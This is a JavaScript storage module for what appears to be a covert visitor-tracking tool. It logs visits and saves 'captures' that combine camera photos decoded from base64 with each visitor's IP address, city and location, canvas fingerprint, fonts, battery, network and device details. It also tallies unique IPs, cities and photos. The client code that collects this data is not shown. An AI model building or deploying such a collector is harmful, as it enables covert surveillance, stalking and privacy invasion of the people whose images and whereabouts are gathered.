const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const DATA_DIR = path.join(__dirname, 'data');
const VISITS_FILE = path.join(DATA_DIR, 'visits.json');
const CAPTURES_FILE = path.join(DATA_DIR, 'captures.json');
const PHOTOS_DIR = path.join(DATA_DIR, 'photos');

function ensureStorage() {
  if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
  if (!fs.existsSync(PHOTOS_DIR)) fs.mkdirSync(PHOTOS_DIR, { recursive: true });
  if (!fs.existsSync(VISITS_FILE)) {
    fs.writeFileSync(VISITS_FILE, JSON.stringify({ visits: [] }, null, 2));
  }
  if (!fs.existsSync(CAPTURES_FILE)) {
    fs.writeFileSync(CAPTURES_FILE, JSON.stringify({ captures: [] }, null, 2));
  }
}

function readVisits() {
  ensureStorage();
  try {
    const data = JSON.parse(fs.readFileSync(VISITS_FILE, 'utf8'));
    return Array.isArray(data.visits) ? data.visits : [];
  } catch {
    return [];
  }
}

function recordVisit(entry) {
  ensureStorage();
  const visits = readVisits();
  visits.push(entry);
  fs.writeFileSync(VISITS_FILE, JSON.stringify({ visits }, null, 2));
  return entry;
}

function readCaptures() {
  ensureStorage();
  try {
    const data = JSON.parse(fs.readFileSync(CAPTURES_FILE, 'utf8'));
    return Array.isArray(data.captures) ? data.captures : [];
  } catch {
    return [];
  }
}

function saveCapture(payload) {
  ensureStorage();
  const id = crypto.randomBytes(8).toString('hex');
  const photoUrls = [];
  const photos = Array.isArray(payload.photos) ? payload.photos : [];

  photos.forEach((photo, index) => {
    try {
      const base64 = String(photo).replace(/^data:image\/[a-z]+;base64,/, '');
      const buffer = Buffer.from(base64, 'base64');
      const filename = `${id}_${index + 1}.jpg`;
      fs.writeFileSync(path.join(PHOTOS_DIR, filename), buffer);
      photoUrls.push(`/data/photos/${filename}`);
    } catch {}
  });

  const entry = {
    id,
    savedAt: new Date().toISOString(),
    serverTime: payload.serverTime,
    clientTime: payload.clientTime,
    ip: payload.ip,
    userAgent: payload.userAgent,
    acceptLanguage: payload.acceptLanguage,
    city: payload.city,
    location: payload.location,
    network: payload.network,
    battery: payload.battery,
    storage: payload.storage,
    webgl: payload.webgl,
    userAgentData: payload.userAgentData,
    mediaDevices: payload.mediaDevices,
    permissions: payload.permissions,
    canvasFingerprint: payload.canvasFingerprint,
    fonts: payload.fonts,
    plugins: payload.plugins,
    platform: payload.platform,
    vendor: payload.vendor,
    screen: payload.screen,
    viewport: payload.viewport,
    colorDepth: payload.colorDepth,
    pixelRatio: payload.pixelRatio,
    orientation: payload.orientation,
    touchSupport: payload.touchSupport,
    maxTouchPoints: payload.maxTouchPoints,
    timezone: payload.timezone,
    timezoneOffset: payload.timezoneOffset,
    deviceMemory: payload.deviceMemory,
    hardwareConcurrency: payload.hardwareConcurrency,
    cookiesEnabled: payload.cookiesEnabled,
    doNotTrack: payload.doNotTrack,
    referrer: payload.referrer,
    pageUrl: payload.pageUrl,
    isSecureContext: payload.isSecureContext,
    clientLanguage: payload.clientLanguage,
    languages: payload.languages,
    photoUrls
  };

  const captures = readCaptures();
  captures.push(entry);
  fs.writeFileSync(CAPTURES_FILE, JSON.stringify({ captures }, null, 2));
  return entry;
}

function getCaptures() {
  return readCaptures().slice().reverse();
}

function getStats() {
  const visits = readVisits();
  const captures = readCaptures();
  const uniqueIps = new Set(visits.map(v => v.ip)).size;
  const photoCount = captures.reduce((sum, c) => sum + (c.photoUrls ? c.photoUrls.length : 0), 0);
  const uniqueCities = new Set(
    captures
      .map(c => c.city && (c.city.city || c.city.locality || c.city.region))
      .filter(Boolean)
  ).size;

  return {
    total: visits.length,
    uniqueIps,
    captures: captures.length,
    photos: photoCount,
    uniqueCities,
    visits
  };
}

module.exports = { recordVisit, readVisits, saveCapture, getCaptures, getStats };